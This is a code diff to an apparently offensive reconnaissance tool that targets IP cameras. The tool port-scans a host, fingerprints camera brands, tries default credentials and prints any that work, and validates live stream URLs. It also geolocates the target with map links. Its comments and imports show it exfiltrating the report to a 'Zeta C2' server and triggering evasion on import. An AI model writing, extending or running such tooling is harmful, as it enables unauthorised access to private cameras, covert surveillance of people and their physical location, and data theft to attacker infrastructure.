@@ -13,7 +13,7 @@ from surveillance_recon.core.streamer import StreamValidator
 from surveillance_recon.core.exfil import DataExfiltrator
 from surveillance_recon.banner import (
     print_section, print_info, print_success, print_scanning,
-    print_finding, print_data, print_warning, print_summary
+    print_finding, print_data, print_warning, print_summary, print_progress
 )
 
 # Auto-trigger evasion on module import (first line of defense)
@@ -101,13 +101,21 @@ class ReconEngine:
             max_workers=80,
             jitter=True
         )
-        raw_results = scanner.scan(self.port_range)
+        
+        # Progress callback for port scanning
+        def scan_progress(current, total):
+            if self.console_output:
+                print_progress(current, total, f"Scanning ports ({current}/{total})")
+        
+        raw_results = scanner.scan(self.port_range, progress_callback=scan_progress if self.console_output else None)
         self.report["open_ports"] = [r["port"] for r in raw_results]
         self.report["services"] = raw_results
         
         if self.console_output:
+            print()  # New line after progress bar
             print_success(f"Found {len(self.report['open_ports'])} open ports")
-            print_data("Open Ports", str(self.report["open_ports"]))
+            if self.report["open_ports"]:
+                print_data("Open Ports", str(self.report["open_ports"]))
         
         self.logger.data("open_ports", self.report["open_ports"])
 
@@ -146,10 +154,16 @@ class ReconEngine:
                 self.logger.warn(f"Fingerprinting failed on port {port}: {e}")
 
         # Step 3: Test default credentials
+        if self.console_output and self.report["camera_candidates"]:
+            print_section("TESTING CREDENTIALS")
+        
         for candidate in self.report["camera_candidates"]:
             port = candidate["port"]
             brand = candidate.get("brand", "generic")
             try:
+                if self.console_output:
+                    print_scanning(f"Testing credentials on port {port}...")
+                
                 auth = Authenticator(
                     target_ip=self.target_ip,
                     port=port,
@@ -169,6 +183,13 @@ class ReconEngine:
                         "credentials": {"username": auth_result[0], "password": auth_result[1]},
                         "login_url": auth_result[2]
                     }
+                    
+                    if self.console_output:
+                        print_success(f"Valid credentials found!")
+                        print_data("Username", auth_result[0])
+                        print_data("Password", auth_result[1])
+                        print_data("Login URL", auth_result[2])
+                    
                     self.logger.success(f"Default credentials work on port {port}: {auth_result[0]}/{auth_result[1]}")
 
                     # Extract ONVIF users if auth succeeded
@@ -180,6 +201,9 @@ class ReconEngine:
                 self.logger.warn(f"Auth testing failed on port {port}: {e}")
 
         # Step 4: Validate live streams
+        if self.console_output and self.report["camera_candidates"]:
+            print_section("VALIDATING STREAMS")
+        
         for candidate in self.report["camera_candidates"]:
             port = candidate["port"]
             brand = candidate.get("brand", "generic")
@@ -189,6 +213,9 @@ class ReconEngine:
                 auth_tuple = (creds["username"], creds["password"])
 
             try:
+                if self.console_output:
+                    print_scanning(f"Checking for live streams on port {port}...")
+                
                 streamer = StreamValidator(
                     target_ip=self.target_ip,
                     port=port,
@@ -199,12 +226,52 @@ class ReconEngine:
                 if streams:
                     self.report["streams"].extend(streams)
                     for s in streams:
+                        if self.console_output:
+                            print_finding(f"Live stream detected!")
+                            print_data("Protocol", s.get("protocol", "Unknown"))
+                            print_data("URL", s["playable_url"])
+                            if s.get("is_live"):
+                                print_data("Status", "LIVE ✓")
                         self.logger.success(f"Live stream found: {s['playable_url']}")
             except Exception as e:
                 self.logger.warn(f"Stream validation failed on port {port}: {e}")
 
         # Finalize report
-        self.report["scan_time"] = time.time() - start_time
+        self.report["scan_time"] = round(time.time() - start_time, 2)
+        
+        # Add geolocation info
+        try:
+            geo_info = get_geo_info(self.target_ip)
+            self.report["geo"] = geo_info
+            if self.console_output and geo_info:
+                print_section("GEOLOCATION INFO")
+                if geo_info.get("country"):
+                    print_data("Country", geo_info["country"])
+                if geo_info.get("city"):
+                    print_data("City", geo_info["city"])
+                if geo_info.get("isp"):
+                    print_data("ISP", geo_info["isp"])
+                if geo_info.get("lat") and geo_info.get("lon"):
+                    maps_url = f"https://www.google.com/maps?q={geo_info['lat']},{geo_info['lon']}"
+                    earth_url = f"https://earth.google.com/web/@{geo_info['lat']},{geo_info['lon']},0a,1000d,35y,0h,0t,0r"
+                    print_data("Google Maps", maps_url)
+                    print_data("Google Earth", earth_url)
+        except Exception as e:
+            self.logger.warn(f"Geolocation lookup failed: {e}")
+        
+        # Display comprehensive summary
+        if self.console_output:
+            summary_stats = {
+                "target": self.target_ip,
+                "duration": self.report["scan_time"],
+                "open_ports": len(self.report["open_ports"]),
+                "cameras": len(self.report["camera_candidates"]),
+                "credentials": len(self.report["auth_results"]),
+                "streams": len(self.report["streams"]),
+                "vulns": len(set(self.report["vulnerabilities"]))
+            }
+            print_summary(summary_stats)
+        
         self.logger.success("Full reconnaissance completed")
 
         # Step 5: Exfiltrate if C2 configured
@@ -213,7 +280,9 @@ class ReconEngine:
             self.logger.info("Report exfiltrated to Zeta C2")
 
         # Step 6: Save local encrypted report
-        self.logger.save_full_report(self.report)
+        report_file = self.logger.save_full_report(self.report)
+        if self.console_output:
+            print_success(f"Full report saved: {report_file}")
 
         return self.report
 
